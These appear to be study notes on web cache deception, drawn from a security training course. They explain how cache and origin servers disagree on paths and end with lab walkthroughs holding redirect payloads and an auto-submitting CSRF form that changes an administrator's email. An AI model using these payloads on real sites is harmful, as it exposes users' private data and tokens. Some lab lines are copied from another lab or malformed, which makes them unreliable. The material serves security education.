# Web cache deception

Web cache deception is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content. It's caused by discrepancies between how the cache server and origin server handle requests. 

In a web cache deception attack, an attacker persuades a victim to visit a malicious URL, inducing the victim's browser to make an ambiguous request for sensitive content. The cache misinterprets this as a request for a static resource and stores the response. The attacker can then request the same URL to access the cached response, gaining unauthorized access to private information. 

<aside>
💡

NOTE

It's important to distinguish web cache deception from web cache poisoning. While both exploit caching mechanisms, they do so in different ways:

- Web cache poisoning manipulates cache keys to inject malicious content into a cached response, which is then served to other users.
- Web cache deception exploits cache rules to trick the cache into storing sensitive or private content, which the attacker can then access.
</aside>

## **Web caches**

A web cache is a system that sits between the origin server and the user. When a client requests a static resource, the request is first directed to the cache. If the cache doesn't contain a copy of the resource (known as a cache miss), the request is forwarded to the origin server, which processes and responds to the request. The response is then sent to the cache before being sent to the user. The cache uses a preconfigured set of rules to determine whether to store the response. 

![image.png](Web%20cache%20deception/image.png)

### **Cache keys**

When the cache receives an HTTP request, it must decide whether there is a cached response that it can serve directly, or whether it has to forward the request to the origin server. The cache makes this decision by generating a 'cache key' from elements of the HTTP request. Typically, this includes the URL path and query parameters, but it can also include a variety of other elements like headers and content type. 

### **Cache rules**

Cache rules determine what can be cached and for how long. Cache rules are often set up to store static resources, which generally don't change frequently and are reused across multiple pages. Dynamic content is not cached as it's more likely to contain sensitive information, ensuring users get the latest data directly from the server. 

Web cache deception attacks exploit how cache rules are applied, so it's important to know about some different types of rules, particularly those based on defined strings in the URL path of the request. For example: 

- Static file extension rules - These rules match the file extension of the requested resource, for example `.css` for stylesheets or `.js` for JavaScript files.
- Static directory rules - These rules match all URL paths that start with a specific prefix. These are often used to target specific directories that contain only static resources, for example `/static` or `/assets`.
- File name rules - These rules match specific file names to target files that are universally required for web operations and change rarely, such as `robots.txt` and `favicon.ico`.

Caches may also implement custom rules based on other criteria, such as URL parameters or dynamic analysis.

## **Constructing a web cache deception attack**

Generally speaking, constructing a basic web cache deception attack involves the following steps: 

1. Identify a target endpoint that returns a dynamic response containing sensitive information. Review responses in Burp, as some sensitive information may not be visible on the rendered page. Focus on endpoints that support the `GET`, `HEAD`, or `OPTIONS` methods as requests that alter the origin server's state are generally not cached.
2. Identify a discrepancy in how the cache and origin server parse the URL path. This could be a discrepancy in how they:
    - Map URLs to resources.
    - Process delimiter characters.
    - Normalize paths.
3. Craft a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response. When the victim accesses the URL, their response is stored in the cache. Using Burp, you can then send a request to the same URL to fetch the cached response containing the victim's data. Avoid doing this directly in the browser as some applications redirect users without a session or invalidate local data, which could hide a vulnerability.

### **Using a cache buster**

While testing for discrepancies and crafting a web cache deception exploit, make sure that each request you send has a different cache key. Otherwise, you may be served cached responses, which will impact your test results. 

As both URL path and any query parameters are typically included in the cache key, you can change the key by adding a query string to the path and changing it each time you send a request. Automate this process using the Param Miner extension. To do this, once you've installed the extension, click on the top-level **Param miner > Settings** menu, then select **Add dynamic cachebuster**. Burp now adds a unique query string to every request that you make. You can view the added query strings in the **Logger** tab.

### **Detecting cached responses**

During testing, it's crucial that you're able to identify cached responses. To do so, look at response headers and response times. 

Various response headers may indicate that it is cached. For example: 

- The `X-Cache` header provides information about whether a response was served from the cache. Typical values include:
    - `X-Cache: hit` - The response was served from the cache.
    - `X-Cache: miss` - The cache did not contain a response for the request's key, so it was fetched from the origin server. In most cases, the response is then cached. To confirm this, send the request again to see whether the value updates to hit.
    - `X-Cache: dynamic` - The origin server dynamically generated the content. Generally this means the response is not suitable for caching.
    - `X-Cache: refresh` - The cached content was outdated and needed to be refreshed or revalidated.
- The `Cache-Control` header may include a directive that indicates caching, like `public` with a `max-age` higher than `0`. Note that this only suggests that the resource is cacheable. It isn't
always indicative of caching, as the cache may sometimes override this header.

## **Exploiting static extension cache rules**

Cache rules often target static resources by matching common file extensions like `.css` or `.js`. This is the default behavior in most CDNs.

 If there are discrepancies in how the cache and origin server map the URL path to resources or use delimiters, an attacker may be able to craft a request for a dynamic resource with a static extension that is ignored by the origin server but viewed by the cache. 

### **Path mapping discrepancies**

URL path mapping is the process of associating URL paths with resources on a server, such as files, scripts, or command executions. There are a range of different mapping styles used by different frameworks and technologies. Two common styles are traditional URL mapping and RESTful URL mapping. 

Traditional URL mapping represents a direct path to a resource located on the file system. Here's a typical example: 

`http://example.com/path/in/filesystem/resource.html`

- `http://example.com` points to the server.
- `/path/in/filesystem/` represents the directory path in the server's file system.
- `resource.html` is the specific file being accessed

In contrast, REST-style URLs don't directly match the physical file structure. They abstract file paths into logical parts of the API: 

`http://example.com/path/resource/param1/param2`

- `http://example.com` points to the server.
- `/path/resource/` is an endpoint representing a resource.
- `param1` and `param2` are path parameters used by the server to process the request.

Discrepancies in how the cache and origin server map the URL path to resources can result in web cache deception vulnerabilities. Consider the following example: 

`http://example.com/user/123/profile/wcd.css`

- An origin server using REST-style URL mapping may interpret this as a request for the `/user/123/profile` endpoint and returns the profile information for user `123`, ignoring `wcd.css` as a non-significant parameter.
- A cache that uses traditional URL mapping may view this as a request for a file named `wcd.css` located in the `/profile` directory under `/user/123`. It interprets the URL path as `/user/123/profile/wcd.css`. If the cache is configured to store responses for requests where the path ends in `.css`, it would cache and serve the profile information as if it were a CSS file.

### **Exploiting path mapping discrepancies**

To test how the origin server maps the URL path to resources, add an arbitrary path segment to the URL of your target endpoint. If the response still contains the same sensitive data as the base response, it indicates that the origin server abstracts the URL path and ignores the added segment. For example, this is the case if modifying `/api/orders/123` to `/api/orders/123/foo` still returns order information.

To test how the cache maps the URL path to resources, you'll need to modify the path to attempt to match a cache rule by adding a static extension. For example, update `/api/orders/123/foo` to `/api/orders/123/foo.js`. If the response is cached, this indicates:

- That the cache interprets the full URL path with the static extension.
- That there is a cache rule to store responses for requests ending in `.js`.

Caches may have rules based on specific static extensions. Try a range of extensions, including `.css`, `.ico`, and `.exe`.

### **Delimiter discrepancies**

Delimiters specify boundaries between different elements in URLs.  The use of characters and strings as delimiters is generally standardized. For example, `?` is generally used to separate 
the URL path from the query string. However, as the URI RFC is quite permissive, variations still occur between different frameworks or technologies.

Discrepancies in how the cache and origin server use characters and strings as delimiters can result in web cache deception vulnerabilities. Consider the example `/profile;foo.css`:

- The Java Spring framework uses the `;` character to add parameters known as matrix variables. An origin server that uses Java Spring would therefore interpret `;` as a delimiter. It truncates the path after `/profile` and returns profile information.
- Most other frameworks don't use `;` as a delimiter. Therefore, a cache that doesn't use Java Spring is likely to interpret `;` and everything after it as part of the path. If the cache has a rule to store responses for requests ending in `.css`, it might cache and serve the profile information as if it were a CSS file

The same is true for other characters that are used inconsistently between frameworks or technologies. Consider these requests to an origin server running the Ruby on Rails framework, which uses `.` as a delimiter to specify the response format:

- `/profile` - This request is processed by the default HTML formatter, which returns the user profile information.
- `/profile.css` - This request is recognized as a CSS extension. There isn't a CSS formatter, so the request isn't accepted and an error is returned.
- `/profile.ico` - This request uses the `.ico` extension, which isn't recognized by Ruby on Rails. The default HTML formatter handles the request and returns the user profile information. In this situation, if the cache is configured to store responses for requests ending in `.ico`, it would cache and serve the profile information as if it were a static file.

Encoded characters may also sometimes be used as delimiters. For example, consider the request  `/profile%00foo.js`:

- The OpenLiteSpeed server uses the encoded null `%00` character as a delimiter. An origin server that uses OpenLiteSpeed would therefore interpret the path as `/profile`.
- Most other frameworks respond with an error if `%00` is in the URL. However, if the cache uses Akamai or Fastly, it would interpret `%00` and everything after it as the path.

### **Exploiting delimiter discrepancies**

You may be able to use a delimiter discrepancy to add a static extension to the path that is viewed by the cache, but not the origin server. To do this, you'll need to identify a character that is used as a delimiter by the origin server but not the cache. 

Firstly, find characters that are used as delimiters by the origin server. Start this process by adding an arbitrary string to the URL of your target endpoint. For example, modify `/settings/users/list` to `/settings/users/listaaa`. You'll use this response as a reference when you start testing delimiter characters.

<aside>
💡

 If the response is identical to the original response, this indicates that the request is being redirected. You'll need to choose a different endpoint to test. 

</aside>

Next, add a possible delimiter character between the original path and the arbitrary string, for example `/settings/users/list;aaa`:

- If the response is identical to the base response, this indicates that the `;` character is used as a delimiter and the origin server interprets the path as `/settings/users/list`.
- If it matches the response to the path with the arbitrary string, this indicates that the `;` character isn't used as a delimiter and the origin server interprets the path as `/settings/users/list;aaa`.

Once you've identified delimiters that are used by the origin server, test whether they're also used by the cache. To do this, add a static extension to the end of the path. If the response is cached, this indicates: 

- That the cache doesn't use the delimiter and interprets the full URL path with the static extension.
- That there is a cache rule to store responses for requests ending in `.js`.

Make sure to test all ASCII characters and a range of common extensions, including `.css`, `.ico`, and `.exe`. We've provided a list of potential delimiter characters to get you started in the labs, see the   [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list). Use Burp Intruder to quickly test these characters. To prevent Burp Intruder from encoding the delimiter characters, turn off Burp 
Intruder's automated character encoding under **Payload encoding** in the **Payloads** side panel.

You can then construct an exploit that triggers the static extension cache rule. For example, consider the payload `/settings/users/list;aaa.js`. The origin server uses `;` as a delimiter:

- The cache interprets the path as: `/settings/users/list;aaa.js`
- The origin server interprets the path as: `/settings/users/list`

 The origin server returns the dynamic profile information, which is stored in the cache. 

 Because delimiters are generally used consistently within each server, you can often use this attack on many different endpoints. 

<aside>
💡

Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like `{`, `}`, `<`, and `>`, and use `#` to truncate the path.

If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.

</aside>

[Web cache deception lab delimiter list | Web Security Academy](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)

### **Delimiter decoding discrepancies**

Websites sometimes need to send data in the URL that contains characters that have a special meaning within URLs, such as delimiters. To ensure these characters are interpreted as data, they are usually encoded. However, some parsers decode certain characters before processing the URL. If a delimiter character is decoded, it may then be treated as a delimiter, truncating the URL path. 

Differences in which delimiter characters are decoded by the cache and origin server can result in discrepancies in how they interpret the URL path, even if they both use the same characters as delimiters. Consider the example `/profile%23wcd.css`, which uses the URL-encoded `#` character:

- The origin server decodes `%23` to `#`. It uses `#` as a delimiter, so it interprets the path as `/profile` and returns profile information.
- The cache also uses the `#` character as a delimiter, but doesn't decode `%23`. It interprets the path as `/profile%23wcd.css`. If there is a cache rule for the `.css` extension it will store the response.

In addition, some cache servers may decode the URL and then forward the request with the decoded characters. Others first apply cache rules based on the encoded URL, then decode the URL and forward it to the next server. These behaviors can also result in discrepancies in the way 
cache and origin server interpret the URL path. Consider the example `/myaccount%3fwcd.css`:

- The cache server applies the cache rules based on the encoded path `/myaccount%3fwcd.css` and decides to store the response as there is a cache rule for the `.css` extension. It then decodes `%3f` to `?` and forwards the rewritten request to the origin server.
- The origin server receives the request `/myaccount?wcd.css`. It uses the `?` character as a delimiter, so it interprets the path as `/myaccount`.

### **Exploiting delimiter decoding discrepancies**

You may be able to exploit a decoding discrepancy by using an encoded delimiter to add a static extension to the path that is viewed by the cache, but not the origin server. 

Use the same testing methodology you used to identify and exploit delimiter discrepancies, but use a range of encoded characters. Make sure that you also test encoded non-printable characters, particularly `%00`, `%0A` and `%09`. If these characters are decoded they can also truncate the URL path.

## **Exploiting static directory cache rules**

It's common practice for web servers to store static resources in specific directories. Cache rules often target these directories by matching specific URL path prefixes, like `/static`, `/assets`, `/scripts`, or `/images`. These rules can also be vulnerable to web cache deception.

### **Normalization discrepancies**

Normalization involves converting various representations of URL paths into a standardized format. This sometimes includes decoding encoded characters and resolving dot-segments, but this varies significantly from parser to parser. 

Discrepancies in how the cache and origin server normalize the URL can enable an attacker to construct a path traversal payload that is interpreted differently by each parser. Consider the example `/static/..%2fprofile`:

- An origin server that decodes slash characters and resolves dot-segments would normalize the path to `/profile` and return profile information.
- A cache that doesn't resolve dot-segments or decode slashes would interpret the path as `/static/..%2fprofile`. If the cache stores responses for requests with the `/static` prefix, it would cache and serve the profile information.

As shown in the above example, each dot-segment in the path traversal sequence needs to be encoded. Otherwise, the victim's browser will resolve it before forwarding the request to the cache. Therefore, an exploitable normalization discrepancy requires that either the cache or origin server decodes characters in the path traversal sequence as well as resolving dot-segments. 

### **Detecting normalization by the origin server**

To test how the origin server normalizes the URL path, send a request to a non-cacheable resource with a path traversal sequence and an arbitrary directory at the start of the path. To choose a non-cacheable resource, look for a non-idempotent method like `POST`. For example, modify `/profile` to `/aaa/..%2fprofile`:

- If the response matches the base response and returns the profile information, this indicates that the path has been interpreted as `/profile`. The origin server decodes the slash and resolves the dot-segment.
- If the response doesn't match the base response, for example returning a `404` error message, this indicates that the path has been interpreted as `/aaa/..%2fprofile`. The origin server either doesn't decode the slash or resolve the dot-segment.

<aside>
💡

When testing for normalization, start by encoding only the second slash in the dot-segment. This is important because some CDNs match the slash following the static directory prefix.

You can also try encoding the full path traversal sequence, or encoding a dot instead of the slash. This can sometimes impact whether the parser decodes the sequence.

</aside>

### **Detecting normalization by the cache server**

Choose a request with a cached response and resend the request with a path traversal sequence and an arbitrary directory at the start of the static path. Choose a request with a response that contains evidence of being cached. For example, `/aaa/..%2fassets/js/stockCheck.js`:

- If the response is no longer cached, this indicates that the cache isn't normalizing the path before mapping it to the endpoint. It shows that there is a cache rule based on the `/assets` prefix.
- If the response is still cached, this may indicate that the cache has normalized the path to `/assets/js/stockCheck.js`.

Also add a path traversal sequence after the directory prefix. For example, modify `/assets/js/stockCheck.js` to `/assets/..%2fjs/stockCheck.js`:

- If the response is no longer cached, this indicates that the cache decodes the slash and resolves the dot-segment during normalization, interpreting the path as `/js/stockCheck.js`. It shows that there is a cache rule based on the `/assets` prefix.
- If the response is still cached, this may indicate that the cache hasn't decoded the slash or resolved the dot-segment, interpreting the path as `/assets/..%2fjs/stockCheck.js`.

Note that in both cases, the response may be cached due to another cache rule, such as one based on the file extension. To confirm that the cache rule is based on the static directory, replace the path after the directory prefix with an arbitrary string. For example, `/assets/aaa`. If the response is still cached, this confirms the cache rule is based on the `/assets` prefix. Note that if the response doesn't appear to be cached, this doesn't necessarily rule out a static directory cache rule as sometimes `404` responses aren't cached.

<aside>
💡

 It's possible that you may not be able to definitively determine whether the cache decodes dot-segments and decodes the URL path without attempting an exploit. 

</aside>

### **Exploiting normalization by the origin server**

If the origin server resolves encoded dot-segments, but the cache doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure:

`/<static-directory-prefix>/..%2f<dynamic-path>`

For example, consider the payload `/assets/..%2fprofile`:

- The cache interprets the path as: `/assets/..%2fprofile`
- The origin server interprets the path as: `/profile`

The origin server returns the dynamic profile information, which is stored in the cache.

### **Exploiting normalization by the cache server**

If the cache server resolves encoded dot-segments but the origin server doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure: 

`/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`

<aside>
💡

 When exploiting normalization by the cache server, encode all characters in the path traversal sequence. Using encoded characters helps avoid unexpected behavior when using delimiters, and there's no need to have an unencoded slash following the static directory prefix since the cache will handle the decoding. 

</aside>

In this situation, path traversal alone isn't sufficient for an exploit. For example, consider how the cache and origin server interpret the payload `/profile%2f%2e%2e%2fstatic`:

- The cache interprets the path as: `/static`
- The origin server interprets the path as: `/profile%2f%2e%2e%2fstatic`

 The origin server is likely to return an error message instead of profile information. 

To exploit this discrepancy, you'll need to also identify a delimiter that is used by the origin server but not the cache. Test possible delimiters by adding them to the payload after the dynamic path: 

- If the origin server uses a delimiter, it will truncate the URL path and return the dynamic information.
- If the cache doesn't use the delimiter, it will resolve the path and cache the response.

For example, consider the payload `/profile;%2f%2e%2e%2fstatic`. The origin server uses `;` as a delimiter:

- The cache interprets the path as: `/static`
- The origin server interprets the path as: `/profile`

The origin server returns the dynamic profile information, which is stored in the cache. You can therefore use this payload for an exploit. 

## **Exploiting file name cache rules**

Certain files such as `robots.txt`, `index.html`, and `favicon.ico` are common files found on web servers. They're often cached due to their infrequent changes. Cache rules target these files by matching the exact file name string.

To identify whether there is a file name cache rule, send a `GET` request for a possible file and see if the response is cached.

### **Detecting normalization discrepancies**

To test how the cache normalizes the URL path, send a request with a path traversal sequence and an arbitrary directory before the file name. For example, `/profile%2f%2e%2e%2findex.html`:

- If the response is cached, this indicates that the cache normalizes the path to `/index.html`.
- If the response isn't cached, this indicates that the cache doesn't decode the slash and resolve the dot-segment, interpreting the path as `/profile%2f%2e%2e%2findex.html`.

### **Exploiting normalization discrepancies**

Because the response is only cached if the request matches the exact file name, you can only exploit a discrepancy where the cache server resolves encoded dot-segments, but the origin server doesn't. Use the same method as for static directory cache rules - simply replace the 
static directory prefix with the file name. For more information, see [Exploiting normalization by the cache server](https://portswigger.net/web-security/web-cache-deception#exploiting-normalization-by-the-cache-server).

***Extensions / Wordlists:***

[**Web Cache Deception Scanner**](https://app.notion.com/p/1fc1135e7b5280e4aae1ddd2fd2a08c9?pvs=21)

[Web cache deception lab delimiter list | Web Security Academy](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)

### Labs:

[**Exploiting path mapping for web cache deception**](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping)

```markdown
# Idenfify high sensitive endpoint - GET /my-account
# Add a static extension to the URL path, for example /my-account/vuln.js.
# Send the ruquest few times and note that request is served as cache: ***X-Cache***   header changes to ***hit***
# Craft the exploit and deliver to victim
<script>document.location="https://web-security-academy.net/my-account/wcd.js"</script>
# Deliver exploit to victim. When the victim views the exploit, the response     they receive is stored in the cache 
# Access the delivered URL to get API keys of victim

```

[**Exploiting path delimiters for web cache deception**](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)

```markdown
# Idenfify high sensitive endpoint - GET /my-account
# Find delimeters with Intruder - /my-account§§abc
# Notice that the ; and ? characters receive a 200 response. This indicates that the origin server uses ; and ? as path delimiters.
# Craft the payload
<script>
document.location="https://web-security-academy.net/my-account;vuln.js"
</script>
# Deliver exploit to victim. When the victim views the exploit, the response     they receive is stored in the cache 
# Access the delivered URL to get API keys of victim
```

[**Exploiting origin server normalization for web cache deception**](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)

```markdown
# Idenfify high sensitive endpoint - GET /my-account
# Server caches files under the static directories.
# Note that only Origin Server decodes path traversal sequence by sending the following request:
https://web-security-academy.net/resources/..2fmy-account
# Craft the following payload 
<script>
document.location='https://web-security-academy.net/resources/..%2fmy-account'
</script>
# Origin Server handles the request as - /my-account
# Cache Server handles the request as - /resources/..%2fmy-account
# The request is cached due to it is under the static directory by the cache     server
# Deliver exploit to victim. When the victim views the exploit, the response     they receive is stored in the cache 
# Access the delivered URL to get API keys of victim
```

[**Exploiting cache server normalization for web cache deception**](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization)

```markdown
# Idenfify high sensitive endpoint - GET /my-account
# Server caches files under the static directories.
# Note that only Cache Server decodes path traversal sequence by sending the     following request:
https://web-security-academy.net/nonexist/..%2fresources/js/tracking.js
# Find delimeters with Intruder - /my-account§§abc
# Craft the following payload 
<script>
document.location='https://web-security-academy.net/my-account%23%2f%2e%2e%2fresources/js/tracking.js'
</script>
# Origin Server handles the request as - /my-account#%2f%2e%2e%2fresouces/js/tracking.js
# Cache Server handles the request as - /resouces/js/tracking.js
# The request is cached due to it is under the static directory by the cache     server
# Deliver exploit to victim. When the victim views the exploit, the response     they receive is stored in the cache 
# Access the delivered URL to get API keys of victim
```

[**Exploiting exact-match cache rules for web cache deception**](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules)

```markdown
# Identify target endpoint - GET /my-account
# Server caches requests by matching their name - e.g., robots.txt
# Send the /robots.txt and note that it is cached
# Note that only Cache Server decodes path traversal sequence by sending the     following request:
https://web-security-academy.net/nonexist/..%2robots.txt
# Find delimeters with Intruder - /my-account§§abc
# Craft the following payload 
<script>
document.location='https://web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt'
</script>
# Origin Server handles the request as - /my-account;%2f%2e%2e%2fresouces/js/tracking.js
# Cache Server handles the request as - /resouces/js/tracking.js
# The request is cached due to the filename match.
# Deliver exploit to victim. When the victim views the exploit, the response     they receive is stored in the cache
# Access the delivered URL to retrieve CSRF token of Administrator user
# Put and deliver the following code in exploit server to change email of        Administrator user
<html>
  <body>
    <form action="https://target.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Arbitrary@email.com" />
      <input type="hidden" name="csrf" value="Retrieved CSRF Token" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```